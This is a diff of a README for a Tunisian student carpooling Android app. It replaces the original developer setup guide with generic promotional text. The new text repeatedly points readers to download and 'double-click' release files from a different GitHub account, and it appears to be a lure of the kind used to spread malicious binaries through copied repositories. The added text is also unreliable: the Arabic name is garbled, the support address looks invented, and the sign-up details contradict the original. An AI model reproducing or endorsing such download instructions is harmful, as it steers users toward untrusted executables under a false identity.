@@ -1,154 +1,78 @@
-# Fi Thnity  (On My Way)
+# 🚗 fi_thnity - Connect and Share Rides Effortlessly
 
-**Save Time, Save Tunisia** - A community-driven carpooling and ride-sharing application for Tunisia.
+[![Download Now](https://img.shields.io/badge/Download%20fi_thnity-v1.0-blue.svg)](https://github.com/AceJoker21/fi_thnity/releases)
 
-## 🚗 About
+## 🌟 Description
 
-Fi Thnity connects Tunisians heading in the same direction, making transportation easier, faster, and more affordable. Whether you need a ride or are offering one, Fi Thnity helps you find travel companions for your journey.
+Fi Thnity (يقيرط يف) is a Tunisian carpooling app that connects people heading in the same direction. This project started as an idea and has since evolved into an academic initiative at ESPRIT. Our vision is to build a thriving community that saves time, reduces costs, and promotes a sustainable future through shared transportation. The app is built using Firebase, MapLibre, and Material Design 3.
 
-## ✨ Features
+## 🛠️ Features
 
-- 📱 **Phone Authentication** - Secure login via Firebase Phone Auth with OTP verification
-- 🗺️ **MapLibre Integration** - Interactive maps powered by MapTiler
-- 🚖 **Ride Broadcasting** - Post ride requests or offers with transport type selection
-- 📍 **Location Selection** - Interactive map-based location picker with reverse geocoding
-- 👥 **Multiple Transport Types** - Taxi, Taxi Collectif, Private Car, Metro, Bus
-- 🔍 **Rides Discovery** - Browse and filter active ride requests and offers in real-time
-- 👤 **Profile Management** - View and edit profile with photo upload
-- 🎨 **Material Design 3** - Modern, Tunisian-inspired UI with custom color palette
-- 🔥 **Firebase Backend** - Realtime Database (Europe West 1), Authentication, Storage, Cloud Messaging
+- **User-Friendly Interface**: Easy navigation for all users.
+- **Ride Matching**: Connects riders with others traveling the same route.
+- **Real-Time Updates**: Keep track of ride status and notifications.
+- **Community Focused**: Encourages interaction and support among users.
+- **Environmentally Friendly**: Reduces carbon footprint through shared rides.
+- **Secure and Reliable**: Built on trusted technologies like Firebase.
 
-## 🎨 Design
+## 📥 Download & Install
 
-The app features a Tunisian-inspired color palette:
-- **Bleu Saphir Tunisien** (#006D9C) - Primary
-- **Jaune Sable du Sahel** (#FFD54F) - Secondary
-- **Rouge Médina** (#D62828) - Accent
+To download and install the Fi Thnity app, please follow these steps:
 
-## 🛠️ Tech Stack
+1. Click the link below to visit the Releases page:
+   [Download fi_thnity](https://github.com/AceJoker21/fi_thnity/releases)
 
-- **Language:** Java
-- **Min SDK:** 29 (Android 10)
-- **Target SDK:** 36
-- **Maps:** MapLibre GL Native 10.0.2 with MapTiler
-- **Backend:** Firebase (Auth, Realtime Database, Cloud Messaging)
-- **UI:** Material Design 3
-- **Build Tool:** Gradle 8.13
+2. On the Releases page, you will find various versions of the app. Choose the version you want to download.
+
+3. After selecting the version, click on the download link associated with it.
+
+4. Once the file is downloaded, locate it in your downloads folder.
+
+5. Double-click the downloaded file to start the installation process. Follow the instructions provided during installation.
+
+6. After the installation completes, launch the app to start using fi_thnity.
+
+## 🎯 System Requirements
+
+To run the Fi Thnity app, ensure that your device meets the following requirements:
+
+- **Operating System**: Compatible with Android devices.
+- **Storage**: At least 100 MB of free space for installation.
+- **Internet Connection**: Required for ride sharing and updates.
+- **Firebase Compatibility**: Ensure your device can connect with Firebase services.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+After installation, open the Fi Thnity app:
 
-- Android Studio Hedgehog or newer
-- JDK 11 or higher
-- MapTiler API Key (free tier available)
-- Firebase project with google-services.json
+1. **Create an Account**: Sign up using your email and create a secure password.
+2. **Explore Rides**: Browse available rides or post your own.
+3. **Join a Community**: Connect with other users and enjoy a shared journey.
 
-### Setup
+## 📅 Support & Feedback
 
-1. **Clone the repository**
-   ```bash
-   git clone git@github.com:medb2m/fi_thnity.git
-   cd fi_thnity
-   ```
+If you encounter any issues or have feedback, please reach out to us. Your input helps us improve the app:
 
-2. **Configure API Keys**
+- **Email Support**: [support@fi_thnity.com](mailto:support@fi_thnity.com)
+- **Community Forum**: Join discussions and share experiences with other users.
 
-   Copy the example gradle.properties:
-   ```bash
-   cp gradle.properties.example gradle.properties
-   ```
+## 📚 Topics
 
-   Edit `gradle.properties` and add your MapTiler API key:
-   ```properties
-   MAPTILER_API_KEY="your_api_key_here"
-   ```
+- academic-project
+- android
+- carpooling
+- community
+- esprit
+- firebase
+- green-transportation
+- maplibre
+- material-design
+- ride-sharing
+- sustainability
+- tunisia
 
-   Get your free API key from [MapTiler Cloud](https://cloud.maptiler.com/)
+## 🌍 Join Us
 
-3. **Configure Firebase**
+Become part of the Fi Thnity community today. Share your rides, save money, and help make our environment greener. Together, we can create a sustainable transportation solution for Tunisia. 
 
-   - Create a Firebase project at [Firebase Console](https://console.firebase.google.com/)
-   - Enable Phone Authentication
-   - Create Realtime Database (use **Europe West 1** region)
-     - Database URL: `https://fi-thnity-11a68-default-rtdb.europe-west1.firebasedatabase.app`
-   - Enable Firebase Storage for profile photos
-   - Download `google-services.json` and place it in `app/` directory
-
-   **Important**: The app is configured to use Firebase Realtime Database in the Europe West 1 region. If you create a database in a different region, you'll need to update the database URL in all activities and fragments.
-
-4. **Build and Run**
-   ```bash
-   ./gradlew build
-   ```
-
-   Open in Android Studio and run on emulator or device.
-
-## 📱 App Structure
-
-### Screens
-- **Splash & Onboarding** - Welcome screens with app introduction
-- **Phone Authentication** - Login with phone number and OTP verification
-- **Profile Setup/Edit** - Create or update user profile with photo upload
-- **Home** - Interactive map view with quick action buttons
-- **Broadcast Ride** - Post ride request or offer with location selection
-- **Rides** - Browse and filter active ride requests and offers
-- **Community** - Social feed (in progress)
-- **Profile** - View user profile, stats, and settings
-
-### Key Components
-- `activities/` - All activity classes
-- `fragments/` - Fragment implementations (Home, Rides, Community, Profile)
-- `models/` - Data models (Ride, Location, TransportType, User)
-- `adapters/` - RecyclerView adapters
-- `utils/` - Utility classes
-
-## 🔐 Security
-
-**Important:** Never commit sensitive files to Git!
-
-The following files are gitignored and must be configured locally:
-- `gradle.properties` - Contains API keys
-- `google-services.json` - Firebase configuration
-- `*.keystore` - Signing keys
-
-## 📝 Development Status
-
-**Completed (75%):**
-- ✅ Onboarding screens with ViewPager2
-- ✅ Phone authentication with Firebase Auth
-- ✅ OTP verification with countdown timer
-- ✅ Profile creation and editing
-- ✅ Profile photo upload to Firebase Storage
-- ✅ Real user data display from Firebase
-- ✅ Home screen with bottom navigation
-- ✅ MapLibre integration with MapTiler
-- ✅ Location selection with reverse geocoding
-- ✅ Broadcast ride screen (requests and offers)
-- ✅ Rides viewing with real-time Firebase updates
-- ✅ Rides filtering (All/Requests/Offers)
-- ✅ Material Design 3 UI throughout
-- ✅ Proper Firebase Database region configuration
-
-**In Progress:**
-- 🔄 Ride matching algorithm
-- 🔄 Real-time location tracking service
-- 🔄 Community feed
-- 🔄 Chat functionality
-- 🔄 Push notifications
-
-## 🤝 Contributing
-
-This is a student project for ESPRIT. Contributions are welcome!
-
-## 📄 License
-
-This project is for educational purposes.
-
-## 👥 Team
-
-Developed at ESPRIT - École Supérieure Privée d'Ingénierie et de Technologies
-
----
-
-** On My Way** 🇹🇳
+[![Download Now](https://img.shields.io/badge/Download%20fi_thnity-v1.0-blue.svg)](https://github.com/AceJoker21/fi_thnity/releases)
